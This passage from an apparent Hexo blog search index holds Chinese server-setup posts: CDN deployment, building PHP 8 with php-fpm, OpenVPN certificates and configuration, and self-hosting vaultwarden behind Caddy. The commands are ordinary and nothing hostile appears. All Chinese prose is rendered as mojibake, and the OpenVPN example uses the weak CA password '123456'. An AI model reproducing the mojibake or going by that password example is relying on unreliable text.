æºç«™ä¿¡æ¯é…ç½®, æŒ‡å‘é™æ€ç½‘ç«™çš„åœ°å€\n\n  ![image-20201128024940139](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128024940139.png)\n\n  \n\n+ æµé‡é™åˆ¶\n\n  è¿›å…¥å†…å®¹åˆ†å‘ç½‘ç»œ->åŸŸåç®¡ç†->é«˜çº§é…ç½®\n\n  ![image-20201128033716089](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128033716089.png)\n\n  è¿›å…¥å†…å®¹åˆ†å‘ç½‘ç»œ->åŸŸåç®¡ç†->è®¿é—®æ§åˆ¶\n\n  ![image-20201128033835738](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128033835738.png)\n\n##### 3 é…ç½®æ’ä»¶\n\n```bash\nnpm install hexo-deployer-cos-cdn --save\n\ndeploy:\n    -\n     type: git\n     repo:\n        github: git@unix2dos:unix2dos/unix2dos.github.io.git\n        coding: git@e.coding.net:levonfly/levonfly.git\n     branch: master\n    -\n     type: cos-cdn\n     cloud: tencent\n     bucket: blog-1300740185\n     region: ap-beijing\n     secretId: x\n     secretKey:  x\n```\n\nhexo, _config.yml è®¾ç½® url ä¸º www.liuvv.com\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://www.cnblogs.com/sunhang32/p/11969964.html \n+ https://github.com/saltbo/uptoc\n+ https://www.jianshu.com/p/25766dda5a5f\n+ https://www.lixl.cn/2020/020936412.html\n+ https://developers.google.com/speed/pagespeed/insights/  æµ‹è¯•ç½‘é¡µåŠ è½½é€Ÿåº¦\n","tags":["blog"],"categories":["åšå®¢"]},{"title":"php8.0å®‰è£…å’Œphp-fpm","url":"%2Fp%2Fad42ac48.html","content":"\n# 1. å®‰è£…\n\n### 1.1  ä¸‹è½½\n\nhttps://www.php.net/downloads  ä¸‹è½½php-8.0.0.tar.gz\n\n<!-- more -->\n\n### 1.2 å®‰è£…\n\n```bash\ntar zxvf php-8.0.0.tar.gz\n\n\nsudo apt install -y pkg-config build-essential autoconf bison re2c libxml2-dev libsqlite3-dev libssl-dev libonig-dev libpng-dev zlib1g-dev libzip-dev\n\n./configure --prefix=/usr/local/php8 --with-config-file-path=/usr/local/php8/etc --enable-fpm --enable-mysqlnd --with-mysqli=mysqlnd --with-pdo-mysql=mysqlnd --enable-mysqlnd-compression-support  --with-zlib  --enable-xml --disable-rpath --enable-bcmath --enable-shmop --enable-sysvsem  --with-curl --enable-mbregex --enable-mbstring --enable-intl   --enable-ftp  --enable-gd-jis-conv  --with-openssl --with-mhash --enable-pcntl --enable-sockets   --enable-soap --with-gettext --enable-fileinfo --enable-opcache --with-pear --without-gdbm --enable-gd --enable-exif --with-zip\n\nmake && make  install\n\n# æŸ¥çœ‹ç‰ˆæœ¬\n/usr/local/php8/bin/php -v \n```\n\n\n\n### 1.3 å¯åŠ¨ php-fpm\n\n```bash\ncd /usr/local/php8/etc\ncp php-fpm.conf.default  php-fpm.conf\nvi php-fpm.conf   \nå»æ‰# pid = run/php-fpm.pid å‰é¢çš„æ³¨é‡Š\n\n\ncd /usr/local/php8/etc/php-fpm.d\ncp www.conf.default  www.conf\n\n\n# æµ‹è¯•\n/usr/local/php8/sbin/php-fpm -t\n\n# å¯åŠ¨\n/usr/local/php8/sbin/php-fpm  # æŠ¥é”™ cannot get gid for group 'nobody'\ngroupadd nobody # å¢åŠ ç»„å³å¯\n```\n\n\n\n### 1.4 é…ç½®\n\n+ nginx é…ç½®\n\n` vi /etc/nginx/sites-enabled/php.conf`\n\n```nginx\nserver {\n        listen          80; \n        server_name  php.liuvv.com;\n        root   /var/www/html/php;\n        index  index.html index.htm index.php;\n\n        location ~ \\.php {\n                fastcgi_pass   127.0.0.1:9000;\n                fastcgi_index  index.php;\n                fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;\n#               fastcgi_split_path_info ^(.+\\.php)(/.*)$;\n#               fastcgi_param PATH_INFO $fastcgi_path_info;\n                include        fastcgi_params;\n        }   \n}\n```\n\n+ å¢åŠ  php æ–‡ä»¶\n\n```bash\n mkdir /var/www/html/php\n vi /var/www/html/php/index.php\n <? phpinfo();\n```\n\n### 1.5 systemctl æœåŠ¡\n\n`vi /usr/lib/systemd/system/php-fpm.service`\n\n```bash\n[Unit]\nDescription=The PHP FastCGI Process Manager\nAfter=syslog.target network.target\n\n[Service]\nType=forking\nPIDFile=/usr/local/php/var/run/php-fpm.pid\nExecStart=/usr/local/php/sbin/php-fpm\nExecReload=/bin/kill -USR2 $MAINPID\nPrivateTmp=true\n\n[Install]\nWantedBy=multi-user.target\n```\n\nå¯åŠ¨æœåŠ¡\n\n```bash\nsystemctl daemon-reload\nsystemctl start php-fpm\n```\n\n\n\n# 2. fastcgiå’Œphp-fpm\n\n### 2.1 CGIåè®®\n\nCGIå…¨ç§°æ˜¯â€œå…¬å…±ç½‘å…³æ¥å£â€(Common Gateway Interface)ï¼ŒHTTPæœåŠ¡å™¨ä¸ä½ çš„æˆ–å…¶å®ƒæœºå™¨ä¸Šçš„ç¨‹åºè¿›è¡Œâ€œäº¤è°ˆâ€çš„ä¸€ç§å·¥å…·ï¼Œå…¶ç¨‹åºé¡»è¿è¡Œåœ¨ç½‘ç»œæœåŠ¡å™¨ä¸Šã€‚\n\nCGIå¯ä»¥ç”¨ä»»ä½•ä¸€ç§è¯­è¨€ç¼–å†™ï¼Œåªè¦è¿™ç§è¯­è¨€å…·æœ‰æ ‡å‡†è¾“å…¥ã€è¾“å‡ºå’Œç¯å¢ƒå˜é‡ã€‚å¦‚php,perl,tclç­‰ã€‚\n\nå½“Nginxæ”¶åˆ°`/index.php`è¿™ä¸ªè¯·æ±‚åï¼Œä¼šå¯åŠ¨å¯¹åº”çš„CGIç¨‹åºï¼Œè¿™é‡Œå°±æ˜¯PHPçš„è§£æå™¨ã€‚æ¥ä¸‹æ¥PHPè§£æå™¨ä¼šè§£æphp.iniæ–‡ä»¶ï¼Œåˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒï¼Œç„¶åå¤„ç†è¯·æ±‚ï¼Œå†ä»¥è§„å®šCGIè§„å®šçš„æ ¼å¼è¿”å›å¤„ç†åçš„ç»“æœï¼Œé€€å‡ºè¿›ç¨‹ã€‚web serverå†æŠŠç»“æœè¿”å›ç»™æµè§ˆå™¨ã€‚\n\n\n\n### 2.2 FastCGIåè®®\n\nFastCGIåƒæ˜¯ä¸€ä¸ªå¸¸é©»(long-live)å‹çš„CGIï¼Œå®ƒå¯ä»¥ä¸€ç›´æ‰§è¡Œç€ï¼Œåªè¦æ¿€æ´»åï¼Œä¸ä¼šæ¯æ¬¡éƒ½è¦èŠ±è´¹æ—¶é—´å»forkä¸€æ¬¡ï¼ˆè¿™æ˜¯CGIæœ€ä¸ºäººè¯Ÿç—…çš„fork-and-execute æ¨¡å¼ï¼‰ã€‚å®ƒè¿˜æ”¯æŒåˆ†å¸ƒå¼çš„è¿ç®—ï¼Œå³ FastCGI ç¨‹åºå¯ä»¥åœ¨ç½‘ç«™æœåŠ¡å™¨ä»¥å¤–çš„ä¸»æœºä¸Šæ‰§è¡Œå¹¶ä¸”æ¥å—æ¥è‡ªå…¶å®ƒç½‘ç«™æœåŠ¡å™¨æ¥çš„è¯·æ±‚ã€‚\n\nFastCGIæ˜¯è¯­è¨€æ— å…³çš„ã€å¯ä¼¸ç¼©æ¶æ„çš„CGIå¼€æ”¾æ‰©å±•ï¼Œå…¶ä¸»è¦è¡Œä¸ºæ˜¯å°†CGIè§£é‡Šå™¨è¿›ç¨‹ä¿æŒåœ¨å†…å­˜ä¸­å¹¶å› æ­¤è·å¾—è¾ƒé«˜çš„æ€§èƒ½ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼ŒCGIè§£é‡Šå™¨çš„åå¤åŠ è½½æ˜¯CGIæ€§èƒ½ä½ä¸‹çš„ä¸»è¦åŸå› ï¼Œå¦‚æœCGIè§£é‡Šå™¨ä¿æŒåœ¨å†…å­˜ä¸­å¹¶æ¥å—FastCGIè¿›ç¨‹ç®¡ç†å™¨è°ƒåº¦ï¼Œåˆ™å¯ä»¥æä¾›è‰¯å¥½çš„æ€§èƒ½ã€ä¼¸ç¼©æ€§ã€Fail- Overç‰¹æ€§ç­‰ç­‰ã€‚\n\n\n\nFastCGIçš„ç‰¹ç‚¹æ˜¯ä¼šåœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­ä¾æ¬¡å®Œæˆå¤šä¸ªè¯·æ±‚ï¼Œä»¥è¾¾åˆ°æé«˜æ•ˆç‡çš„ç›®çš„ï¼Œå¤§å¤šæ•°FastCGIå®ç°éƒ½ä¼šç»´æŠ¤ä¸€ä¸ªè¿›ç¨‹æ± ã€‚\n\n\n\n### 2.3 PHP-CGIè§£é‡Šå™¨\n\nPHP-CGIæ˜¯PHPè‡ªå¸¦çš„FastCGIç®¡ç†å™¨ã€‚\n\nPHP-CGIçš„ä¸è¶³ï¼š\n\n1. php-cgiå˜æ›´php.inié…ç½®åéœ€é‡å¯php-cgiæ‰èƒ½è®©æ–°çš„php-iniç”Ÿæ•ˆï¼Œä¸å¯ä»¥å¹³æ»‘é‡å¯ã€‚\n2. ç›´æ¥æ€æ­»php-cgiè¿›ç¨‹ï¼Œphpå°±ä¸èƒ½è¿è¡Œäº†ã€‚\n\nPHP-CGIåªæ˜¯ä¸ªCGIç¨‹åºï¼Œä»–è‡ªå·±æœ¬èº«åªèƒ½è§£æè¯·æ±‚ï¼Œè¿”å›ç»“æœï¼Œä¸ä¼šè¿›ç¨‹ç®¡ç†ã€‚æ‰€ä»¥å°±å‡ºç°äº†ä¸€äº›èƒ½å¤Ÿè°ƒåº¦ php-cgi è¿›ç¨‹çš„ç¨‹åºï¼Œæ¯”å¦‚è¯´ç”±lighthttpdåˆ†ç¦»å‡ºæ¥çš„spawn-fcgiã€‚åŒæ ·ï¼ŒPHP-FPMä¹Ÿæ˜¯ç”¨äºè°ƒåº¦ç®¡ç†PHPè§£æå™¨php-cgiçš„ç®¡ç†ç¨‹åºã€‚\n\n\n\n### 2.4 PHP-FPMè°ƒåº¦PHP-CGI\n\nPHPçš„è§£é‡Šå™¨æ˜¯php-cgiã€‚php-cgiåªæ˜¯ä¸ªCGIç¨‹åºï¼Œä»–è‡ªå·±æœ¬èº«åªèƒ½è§£æè¯·æ±‚ï¼Œè¿”å›ç»“æœï¼Œä¸ä¼šè¿›ç¨‹ç®¡ç†ï¼ˆçš‡ä¸Šï¼Œè‡£å¦¾çœŸçš„åšä¸åˆ°å•Šï¼ï¼‰\n\næ‰€ä»¥å°±å‡ºç°äº†ä¸€äº›èƒ½å¤Ÿè°ƒåº¦php-cgiè¿›ç¨‹çš„ç¨‹åºï¼Œæ¯”å¦‚è¯´ç”±lighthttpdåˆ†ç¦»å‡ºæ¥çš„spawn-fcgiã€‚PHP-FPMä¹Ÿæ˜¯ç”¨äºè°ƒåº¦ç®¡ç†PHPè§£æå™¨php-cgiçš„ç®¡ç†ç¨‹åºã€‚\n\n\n\n### 2.5 é—®é¢˜å›ç­”\n\n+ fastcgiæ˜¯ä¸€ä¸ªåè®®ï¼Œphp-fpmå®ç°äº†è¿™ä¸ªåè®®ï¼› \n\n  å¯¹ã€‚\n\n+ æœ‰çš„è¯´ï¼Œphp-fpmæ˜¯fastcgiè¿›ç¨‹çš„ç®¡ç†å™¨ï¼Œç”¨æ¥ç®¡ç†fastcgiè¿›ç¨‹çš„ï¼› \n\n  å¯¹ã€‚\n\n  php-fpmçš„ç®¡ç†å¯¹è±¡æ˜¯php-cgiã€‚ä½†ä¸èƒ½è¯´php-fpmæ˜¯fastcgiè¿›ç¨‹çš„ç®¡ç†å™¨ï¼Œfastcgiæ˜¯ä¸ªåè®®ï¼Œä¼¼ä¹æ²¡æœ‰è¿™ä¹ˆä¸ªè¿›ç¨‹å­˜åœ¨ï¼Œå°±ç®—å­˜åœ¨php-fpmä¹Ÿç®¡ç†ä¸äº†ä»–ï¼ˆè‡³å°‘ç›®å‰æ˜¯ï¼‰ã€‚\n\n+ æœ‰çš„è¯´ï¼Œphp-fpmæ˜¯phpå†…æ ¸çš„ä¸€ä¸ªè¡¥ä¸; \n\n  ä»¥å‰æ˜¯å¯¹çš„ã€‚\n\n  å› ä¸ºæœ€å¼€å§‹çš„æ—¶å€™php-fpmæ²¡æœ‰åŒ…å«åœ¨PHPå†…æ ¸é‡Œé¢ï¼Œè¦ä½¿ç”¨è¿™ä¸ªåŠŸèƒ½ï¼Œéœ€è¦æ‰¾åˆ°ä¸æºç ç‰ˆæœ¬ç›¸åŒçš„php-fpmå¯¹å†…æ ¸æ‰“è¡¥ä¸ï¼Œç„¶åå†ç¼–è¯‘ã€‚åæ¥PHPå†…æ ¸é›†æˆäº†PHP-FPMä¹‹åå°±æ–¹ä¾¿å¤šäº†ï¼Œä½¿ç”¨--enalbe-fpmè¿™ä¸ªç¼–è¯‘å‚æ•°å³å¯ã€‚\n\n+ æœ‰çš„è¯´ï¼Œä¿®æ”¹äº†php.inié…ç½®æ–‡ä»¶åï¼Œæ²¡åŠæ³•å¹³æ»‘é‡å¯ï¼Œæ‰€ä»¥å°±è¯ç”Ÿäº†php-fpmï¼› \n\n  æ˜¯çš„ã€‚\n  ä¿®æ”¹php.iniä¹‹åï¼Œphp-cgiè¿›ç¨‹çš„ç¡®æ˜¯æ²¡åŠæ³•å¹³æ»‘é‡å¯çš„ã€‚php-fpmå¯¹æ­¤çš„å¤„ç†æœºåˆ¶æ˜¯æ–°çš„workerç”¨æ–°çš„é…ç½®ï¼Œå·²ç»å­˜åœ¨çš„workerå¤„ç†å®Œæ‰‹ä¸Šçš„æ´»å°±å¯ä»¥æ­‡ç€äº†ï¼Œé€šè¿‡è¿™ç§æœºåˆ¶æ¥å¹³æ»‘è¿‡åº¦ã€‚\n\n+ è¿˜æœ‰çš„è¯´php-cgiæ˜¯PHPè‡ªå¸¦çš„FastCGIç®¡ç†å™¨ï¼Œé‚£è¿™æ ·çš„è¯å¹²å—åˆå¼„ä¸ªphp-fpmå‡ºæ¥ï¼›\n\n  php-cgiä¸php-fpmä¸€æ ·ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªfastcgiè¿›ç¨‹ç®¡ç†å™¨\n\n  php-cgiçš„é—®é¢˜åœ¨äº 1ã€php-cgiå˜æ›´php.inié…ç½®åéœ€é‡å¯php-cgiæ‰èƒ½è®©æ–°çš„php-iniç”Ÿæ•ˆï¼Œä¸å¯ä»¥å¹³æ»‘é‡å¯ 2ã€ç›´æ¥æ€æ­»php-cgiè¿›ç¨‹,phpå°±ä¸èƒ½è¿è¡Œäº†ã€‚(PHP-FPMå’ŒSpawn-FCGIå°±æ²¡æœ‰è¿™ä¸ªé—®é¢˜,å®ˆæŠ¤è¿›ç¨‹ä¼šå¹³æ»‘ä»æ–°ç”Ÿæˆæ–°çš„å­è¿›ç¨‹ã€‚ï¼‰ é’ˆå¯¹php-cgiçš„ä¸è¶³ï¼Œphp-fpmåº”è¿è€Œç”Ÿã€‚\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://www.jianshu.com/p/7627c794b272\n+ https://segmentfault.com/q/1010000000256516\n+ https://huaien.co/technology/no-enough-memory-to-make-php/ (ç¼–è¯‘æ—¶å†…å­˜ä¸è¶³çš„é—®é¢˜)\n\n","tags":["php"],"categories":["php"]},{"title":"openvpnæ­å»ºè™šæ‹Ÿå±€åŸŸç½‘","url":"%2Fp%2Fa84d9911.html","content":"\n### 0. å‰è¨€\n\nOpenVPN æ˜¯ä¸€ä¸ªå¥å£®çš„ã€é«˜åº¦çµæ´»çš„ [VPN](https://en.wikipedia.org/wiki/VPN) å®ˆæŠ¤è¿›ç¨‹ã€‚å®ƒæ”¯æŒ [SSL/TLS](https://en.wikipedia.org/wiki/SSL/TLS) å®‰å…¨ã€[Ethernet bridging](https://en.wikipedia.org/wiki/Bridging_(networking))ã€ç»ç”±[ä»£ç†](https://en.wikipedia.org/wiki/Proxy_server)çš„ [TCP](https://en.wikipedia.org/wiki/Transmission_Control_Protocol) æˆ– [UDP](https://en.wikipedia.org/wiki/User_Datagram_Protocol) [éš§é“](https://en.wikipedia.org/wiki/Tunneling_protocol)å’Œ [NAT](https://en.wikipedia.org/wiki/Network_address_translation)ã€‚å¦å¤–ï¼Œå®ƒä¹Ÿæ”¯æŒåŠ¨æ€ IP åœ°å€ä»¥åŠ [DHCP](https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol)ï¼Œå¯ä¼¸ç¼©æ€§è¶³ä»¥æ”¯æŒæ•°ç™¾æˆ–æ•°åƒç”¨æˆ·çš„ä½¿ç”¨åœºæ™¯ï¼ŒåŒæ—¶å¯ç§»æ¤è‡³å¤§å¤šæ•°ä¸»æµæ“ä½œç³»ç»Ÿå¹³å°ä¸Šã€‚\n\n##### å®‰è£…openvpn\n\n```bash\nsudo apt install openvpn\n```\n\n<!-- more -->\n\n### 1. ç”Ÿæˆè¯ä¹¦\n\n```bash\ngit clone https://github.com/OpenVPN/easy-rsa\ncd easyrsa3\n```\n\n\n\n##### 1.1 ç”Ÿæˆ CA\n\n```bash\n./easyrsa init-pki\n\n./easyrsa build-ca  \n# è¾“å…¥å¯†ç : 123456\nCommon Name: OpenVPN-CA\n```\n\npkiæ–‡ä»¶å¤¹ä¸‹ä¼šç”Ÿæˆ ca.crt\n\n\n\n##### 1.2 ç”Ÿæˆserverå’Œ client å…¬é’¥ç§é’¥å¯¹\n\n```bash\n./easyrsa build-server-full server\n\n./easyrsa build-client-full client1\n./easyrsa build-client-full client2\n./easyrsa build-client-full client3\n```\n\npki/private æ˜¯ç§æœ‰çš„ key\n\npki/issued æ˜¯å…¬æœ‰çš„ key\n\n\n\n##### 1.3 ç”ŸæˆDiffie-Hellman pem \n\n```bash\n./easyrsa gen-dh\n```\n\npki æ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆäº† dh.pem\n\n\n\n##### 1.4 ç°åœ¨æˆ‘ä»¬æœ‰äº†\n\n| **Filename** | **Needed By**            | **Purpose**               | **Secret** |\n| ------------ | ------------------------ | ------------------------- | ---------- |\n| ca.crt       | server + all clients     | Root CA certificate       | NO         |\n| ca.key       | key signing machine only | Root CA key               | YES        |\n| dh{n}.pem    | server only              | Diffie Hellman parameters | NO         |\n| server.crt   | server only              | Server Certificate        | NO         |\n| server.key   | server only              | Server Key                | YES        |\n| client1.crt  | client1 only             | Client1 Certificate       | NO         |\n| client1.key  | client1 only             | Client1 Key               | YES        |\n| client2.crt  | client2 only             | Client2 Certificate       | NO         |\n| client2.key  | client2 only             | Client2 Key               | YES        |\n| client3.crt  | client3 only             | Client3 Certificate       | NO         |\n| client3.key  | client3 only             | Client3 Key               | YES        |\n\n\n\n### 2. é…ç½®æ–‡ä»¶\n\nåœ¨å®‰è£…ç›®å½•ä¸‹(`/usr/share/doc/openvpn/examples/sample-config-files`)æ‰¾åˆ°é…ç½® `server.conf` and `client.conf`\n\nå¦‚æœåªæœ‰æœ‰ server.conf.gz çš„è¯, éœ€è¦è§£å‹\n\n```bash\ngunzip -c server.conf.gz > server.conf\n```\n\n\n\n##### 2.1  æœåŠ¡ç«¯ä¿®æ”¹è¯ä¹¦è·¯å¾„\n\nBefore you use the sample configuration file, you should first edit the **ca**, **cert**, **key**, and **dh** parameters to point to the files you generated in the [PKI](https://openvpn.net/community-resources/how-to/#setting-up-your-own-certificate-authority-ca-and-generating-certificates-and-keys-for-an-openvpn-server-and-multiple-clients) section above.\n\n##### 2.2 æœåŠ¡ç«¯dev æ¨¡å¼å¯ä»¥ä¿®æ”¹  tap tun\n\n##### 2.3 æœåŠ¡ç«¯ä¿®æ”¹ ip èŒƒå›´\n\nIf you want to use a virtual IP address range other than `10.8.0.0/24`, you should modify the `server` directive. Remember that this virtual IP address range should be a private range which is currently unused on your network.\n\n\n\nThe Internet Assigned Numbers Authority (IANA) has reserved the following three blocks of the IP address space for private internets (codified in RFC 1918):\n\n| 10.0.0.0    | 10.255.255.255  | (10/8 prefix)       |\n| ----------- | --------------- | ------------------- |\n| 172.16.0.0  | 172.31.255.255  | (172.16/12 prefix)  |\n| 192.168.0.0 | 192.168.255.255 | (192.168/16 prefix) |\n\nThe best candidates are subnets in the middle of the vast 10.0.0.0/8 netblock (for example 10.66.77.0/24).\n\n\n\n##### 2.4 æœåŠ¡ç«¯ä¿®æ”¹ client ä¹‹é—´å¯è¿æ¥\n\nUncomment out the `client-to-client` directive if you would like connecting clients to be able to reach each other over the VPN. By default, clients will only be able to reach the server.\n\n##### 2.5 æœåŠ¡ç«¯ä¿®æ”¹ user å’Œ group\n\nIf you are using Linux, BSD, or a Unix-like OS, you can improve security by uncommenting out the **user nobody** and **group nobody** directives.\n\n##### 2.6 å®¢æˆ·ç«¯ä¿®æ”¹è¯ä¹¦è·¯å¾„\n\n`ca`, `cert`, `key`\n\n##### 2.7 å®¢æˆ·ç«¯ä¿®æ”¹ remote å‚æ•°\n\n```bash\nremote my-server-1 1194\n```\n\n\n\n##### 2.8 æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯çš„ `dev` (tun or tap) and `proto` (udp or tcp) è¦ä¸€è‡´\n\n\n\n### 3. å¯åŠ¨ä½¿ç”¨\n\n##### 3.1 å¯åŠ¨ server\n\n```bash\nsudo openvpn /etc/openvpn/server.conf\n```\n\næˆåŠŸå¯åŠ¨ä»¥åä¼šå‘ç°å¤šäº†ä¸€ä¸ª tun ç½‘å£\n\n\n\nå¦‚é‡åˆ°é”™è¯¯: [Open VPN options error: --tls-auth fails with 'ta.key': no such file or directory](https://unix.stackexchange.com/questions/359428/open-vpn-options-error-tls-auth-fails-with-ta-key-no-such-file-or-director)\n\n```bash\nsudo openvpn --genkey --secret /etc/openvpn/certs/ta.key\n```\n\n\n\n##### 3.2 å¯åŠ¨ client\n\n```Â bash\nsudo openvpn /etc/openvpn/client.conf\n```\n\n\n\nå¦‚é‡åˆ°é”™è¯¯: Authenticate/Decrypt packet error: packet HMAC authentication failed, é…ç½®æ–‡ä»¶é‡Œ,\n\n```bash\ntls-auth /etc/openvpn/certs/ta.key 0  #æœåŠ¡å™¨ç”¨0\n\ntls-auth /etc/openvpn/certs/ta.key 1  #å®¢æˆ·ç«¯ç”¨1\n```\n\næ³¨æ„, è¿™ä¸ª key æ˜¯åŒä¸€ä¸ª, åœ¨æœåŠ¡å™¨ç”Ÿæˆ, ä¸æ˜¯æ¯ä¸ªéƒ½ç”Ÿæˆä¸€æ¬¡\n\n\n\n##### 3.3 æµ‹è¯•\n\nåœ¨å®¢æˆ·ç«¯  `ping 10.8.0.1`\n\nIf the ping succeeds, congratulations! You now have a functioning VPN.\n\næˆ‘ä»¬ä¹Ÿå¯ä»¥ `ssh user@10.8.0.1` å‘ç°ä¹Ÿå¯ä»¥\n\n\n\n##### 3.4 mac ä½¿ç”¨\n\nhttps://tunnelblick.net/ ä¸‹è½½å®‰è£…åŒ…\n\nå¯ä»¥ç”Ÿæˆ.ovpn æ–‡ä»¶, å‚è€ƒhttps://serverfault.com/a/483967\n\n\n\n### 4. openvpnæœåŠ¡\n\n##### 4.1 server service\n\n```bash\nsudo systemctl start openvpn@server.service\n\nsudo systemctl enable openvpn@server.service\n```\n\néœ€è¦è¾“å…¥å¯†ç è¯·è¿™æ ·\n\n```bash\nsudo systemd-tty-ask-password-agent \n```\n\n\n\n##### 4.2 client service\n\n```bash\nsudo systemctl start openvpn@client.service\n\nsudo systemctl enable openvpn@client.service\n```\n\n\n\n### 5. å®¢æˆ·ç«¯åˆ†é…å›ºå®š IP\n\n```bash\ncd /etc/openvpn\nmkdir ccd\n\n# é…ç½®æ–‡ä»¶ä¿®æ”¹client-config-dir\nvim server.conf\nclient-config-dir ccd\n\n#åœ¨ccdæ–‡ä»¶å¤¹ä¸‹å»ºç«‹ä»¥ç”¨æˆ·å(Common Name)ä¸ºåç§°çš„æ–‡ä»¶\ncd ccd\n\nvi client1\nifconfig-push 10.8.0.2 255.255.255.0\n\nvi client2\nifconfig-push 10.8.0.3 255.255.255.0\n```\n\n\n\n### 6. å‚è€ƒèµ„æ–™\n\n+ https://openvpn.net/community-resources/how-to/\n\n+ https://github.com/OpenVPN/easy-rsa\n\n+ https://tunnelblick.net/\n\n+ https://community.openvpn.net/openvpn/wiki/Concepts-Addressing","tags":["openvpn"],"categories":["è½¯ä»¶"]},{"title":"bitwardonå¯†ç ç®¡ç†å…è´¹å®‰è£…ä½¿ç”¨","url":"%2Fp%2F8e14412f.html","content":"\nä¸ºä»€ä¹ˆå†™è¿™ç¯‡æ–‡ç« ï¼Œå› ä¸º1Passwordå®åœ¨æ˜¯å¤ªè´µäº†ã€‚Bitwardenè‡ªå»ºå¯†ç å­˜å‚¨ç³»ç»Ÿç¡®å®å¯ä»¥å®Œç¾æ›¿ä»£1Passwordç­‰ä»˜è´¹çš„å¯†ç ç®¡ç†æœåŠ¡ï¼Œå¦å¤– vaultwarden æ”¯æŒå®˜æ–¹ä»˜è´¹æ‰èƒ½å®ç°çš„æœåŠ¡ã€‚\n\n<!-- more -->\n\n# 1.å®‰è£…ä½¿ç”¨\n\n### 1.1 å‡†å¤‡\n\né¦–å…ˆæŠŠè‡ªå·±çš„åŸŸåè§£æåˆ°æœåŠ¡å™¨ä¸Šï¼Œå› ä¸ºç”¨caddyï¼Œä¸ç”¨è‡ªå·±å»ç”³è¯·è¯ä¹¦å°±å¯ä»¥httpsã€‚\n\n<img src=\"bitwardonå¯†ç ç®¡ç†å…è´¹å®‰è£…ä½¿ç”¨/1.png\" alt=\"image-20220127145830908\" style=\"zoom:50%;\" />\n\n\n\n### 1.2 å®‰è£…\n\n```bash\napt install docker-compose \n```\n\nåˆ›å»ºä¸¤ä¸ªæ–‡ä»¶ã€‚\n\n+ vi docker-compose.yml\n\n  ```yml\n  version: '3'\n\n  services:\n          vaultwarden:\n                  image: vaultwarden/server:latest\n                  container_name: vaultwarden\n                  restart: always\n                  environment:\n                          - WEBSOCKET_ENABLED=true  # Enable WebSocket notifications.\n                  volumes:\n                          - ./vw-data:/data\n\n          caddy:\n                  image: caddy:2\n                  container_name: caddy\n                  restart: always\n                  ports:\n                          - 6666:80  # Needed for the ACME HTTP-01 challenge.\n                          - 443:443\n                  volumes:\n                          - ./Caddyfile:/etc/caddy/Caddyfile:ro\n                          - ./caddy-config:/config\n                          - ./caddy-data:/data\n                  environment:\n                          - DOMAIN=https://mima.liuvv.com  # Your domain.\n                          - EMAIL=levonfly@gmail.com                # The email address to use for ACME registration.\n                          - LOG_FILE=/data/access.log\n\n  ```\n\n+ vi Caddyfile\n\n  ```yml\n  {$DOMAIN}:443 {\n    log {\n      level INFO\n      output file {$LOG_FILE} {\n        roll_size 10MB\n        roll_keep 10\n      }\n    }\n  \n    # Use the ACME HTTP-01 challenge to get a cert for the configured domain.\n    tls {$EMAIL}\n  \n    # This setting may have compatibility issues with some browsers\n    # (e.g., attachment downloading on Firefox). Try disabling this\n    # if you encounter issues.\n    encode gzip\n  \n    # Notifications redirected to the WebSocket server\n    reverse_proxy /notifications/hub vaultwarden:3012\n  \n    # Proxy everything else to Rocket\n    reverse_proxy vaultwarden:80 {\n         # Send the true remote IP to Rocket, so that vaultwarden can put this in the\n         # log, so that fail2ban can ban the correct IP.\n         header_up X-Real-IP {remote_host}\n    }\n  }\n  \n  ```\n\n+ å¯åŠ¨å’Œé€€å‡º\n\n```bash\ndocker-compose up -d\ndocker-compose down\n```\n\n\n\n### 1.3 ä½¿ç”¨\n\nåœ¨ç½‘é¡µï¼Œæ‰‹æœºï¼Œæ¡Œé¢ç‰ˆï¼Œç‚¹å‡»è®¾ç½®çš„é½¿è½®ï¼Œå°±å¯ä»¥è¾“å…¥è‡ªå·±çš„æœåŠ¡å™¨URLï¼Œæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç™»å½•å³å¯ã€‚\n\n<img src=\"bitwardonå¯†ç ç®¡ç†å…è´¹å®‰è£…ä½¿ç”¨/2.png\" alt=\"image-20220127145009101\" style=\"zoom: 50%;\" />\n\n# 2. ç§»æ¤\n\n+ å®‰è£…èµ°ä¸€é\n+ åŸŸåè§£ææ¢æ‰\n+ æ‹·è´vm-dataä¸‹çš„ `dq.sqlite3`  å’Œ `icon_cace`\n+ é‡å¯docker\n\n\n\n# 3. å¤‡ä»½\n\nè‡ªåŠ¨å¤‡ä»½åˆ°dropboxå¤±è´¥ï¼Œå› ä¸ºéƒ¨ç½²çš„å°ç ´æœåŠ¡å™¨æ— æ³•ç¿»Qã€‚\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://github.com/dani-garcia/vaultwarden/wiki/Using-Docker-Compose\n+ https://wzfou.com/bitwarden-mima/\n+ https://www.moec.top/archives/285","tags":["å¯†ç "],"categories":["è½¯ä»¶"]},{"title":"macè®¾ç½®é»˜è®¤è¾“å…¥æ³•","url":"%2Fp%2F88c7abb.html","content":"\nä¸­æ–‡è¾“å…¥æ³•ä½œä¸ºé¦–é€‰è¾“å…¥æ³•, ç®€å•ä¸€æ­¥, å´èƒ½è®©ä½ ä½¿ç”¨ macOS çš„å¹¸ç¦æ„Ÿæå‡ä¸€å¤§æˆªã€‚\n\n<!-- more -->\n\n### 1. 